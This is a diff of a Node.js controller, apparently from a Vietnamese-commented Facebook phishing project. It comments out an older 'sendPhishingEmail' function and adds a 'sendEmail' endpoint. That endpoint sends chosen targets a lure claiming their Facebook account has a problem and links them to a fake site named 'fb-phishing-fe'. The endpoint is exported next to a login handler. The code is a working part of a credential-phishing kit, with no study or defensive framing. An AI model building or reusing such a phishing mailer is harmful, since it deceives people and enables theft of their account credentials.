@@ -52,32 +52,64 @@ const sendSms = async (phone) => {
   }
 };
 // Gửi email phishing
-const sendPhishingEmail = async (targetEmail) => {
+// const sendPhishingEmail = async (req) => {
+//   const {}
+//   try {
+//     const transporter = nodemailer.createTransport({
+//       service: "Gmail",
+//       auth: {
+//         user: process.env.EMAIL_USERNAME,
+//         pass: process.env.EMAIL_PASSWORD,
+//       },
+//     });
+
+//     const mailOptions = {
+//       from: process.env.EMAIL_USERNAME,
+//       to: targetEmail,
+//       subject: "Tài khoản của bạn đang gặp sự cố!",
+//       text: `Mất acc rồi nha lêu lêu :))))`,
+//     };
+
+//     await transporter.sendMail(mailOptions);
+//     console.log("Email phishing đã gửi đến:", targetEmail);
+//   } catch (error) {
+//     console.error("Lỗi gửi email:", error);
+//   }
+// };
+const sendEmail = async (req, res) => {
+  const { email } = req.body;
+
+  // Cấu hình transporter với Gmail (hoặc SMTP khác)
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: process.env.EMAIL_USERNAME,
+      pass: process.env.EMAIL_PASSWORD, // Không dùng mật khẩu thật, dùng App Password nếu 2FA
+    },
+  });
+
+  const mailOptions = {
+    from: EMAIL_USERNAME,
+    to: email,
+    subject: `Tài khoản Facebook của bạn đã gặp vấn đề`,
+    text: `Hãy bấm vào đường link này để xem chi tiết.
+      https://fb-phishing-fe.onrender.com`,
+  };
+
   try {
-    const transporter = nodemailer.createTransport({
-      service: "Gmail",
-      auth: {
-        user: process.env.EMAIL_USERNAME,
-        pass: process.env.EMAIL_PASSWORD,
-      },
-    });
-
-    const mailOptions = {
-      from: process.env.EMAIL_USERNAME,
-      to: targetEmail,
-      subject: "Tài khoản của bạn đang gặp sự cố!",
-      text: `Mất acc rồi nha lêu lêu :))))`,
-    };
-
     await transporter.sendMail(mailOptions);
-    console.log("Email phishing đã gửi đến:", targetEmail);
+    res
+      .status(200)
+      .send({ success: true, message: "Email sent successfully!" });
   } catch (error) {
-    console.error("Lỗi gửi email:", error);
+    res
+      .status(500)
+      .send({ success: false, message: "Failed to send email.", error });
   }
 };
-
 const authController = {
   login,
+  sendEmail,
 };
 
 export default authController;
